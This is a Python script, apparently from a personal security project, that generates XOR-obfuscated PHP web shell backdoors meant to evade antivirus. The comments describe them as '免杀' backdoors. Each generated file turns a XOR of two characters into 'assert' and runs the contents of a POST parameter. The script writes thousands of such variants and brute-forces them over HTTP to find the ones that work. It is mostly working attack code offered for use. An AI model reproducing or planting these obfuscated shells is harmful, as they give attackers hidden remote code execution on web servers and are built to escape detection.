# -*- coding:utf-8 -*-
# php 异或免杀,后门代码(无字符后门)：
# <?php $a= ("!"^"@").'ssert'; $a($_POST[x]);?>
import queue
import threading

import requests


def post():
    while not q.empty():
        filename = q.get()
        url = 'http://192.168.110.34/payload/' + filename
        data = {
            'x': 'phpinfo();'
        }
        try:
            res = requests.post(url=url, data=data).content.decode('utf-8')
            if 'php' in res:
                print(str(i) + '_' + str(j) + '.php')
        except Exception as e:
            pass


if __name__ == '__main__':
    q = queue.Queue()
    for i in range(1, 127):
        for j in range(1, 127):
            filename = str(i) + '_' + str(j) + '.php'
            code = "<?php $a= ('" + chr(i) + "'" + '^' + "'" + chr(j) + "')" + ".'ssert'; $a($_POST[x]);?>"
            q.put(filename)
            with open(r'E:/Sec/Language/Python/Project/Scanner/demo3/payload/' + filename,
                      'a') as f:
                f.write(code)
                f.close()

    for thread in range(20):
        t = threading.Thread(target=post)
        t.start()

